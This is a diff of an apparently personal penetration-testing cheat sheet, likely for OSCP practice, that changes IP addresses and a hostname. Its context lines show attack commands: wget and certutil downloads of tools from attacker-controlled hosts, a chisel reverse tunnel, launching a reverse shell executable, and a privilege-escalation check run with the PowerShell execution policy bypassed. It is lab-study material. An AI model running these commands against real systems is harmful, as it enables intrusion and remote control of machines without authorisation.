@@ -43,7 +43,7 @@ python -m http.server 80
 
 wget 192.168.45.178:8000/chisel
 chmod 777 chisel
-./chisel client 192.168.45.221:5000 R:4444:localhost:8080
+./chisel client 192.168.45.204:5000 R:4444:localhost:8080
 
 wget 10.10.14.11:8000/chisel
 chmod 777 chisel
@@ -184,7 +184,7 @@ certutil.exe -f -urlcache -split http://192.168.45.221:8000/
 
 Start-Process -NoNewWindow .\shell443.exe
 
-Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:ms01.oscp.exam"
+Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:asr.arst.ars"
 
 powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML"
 ```
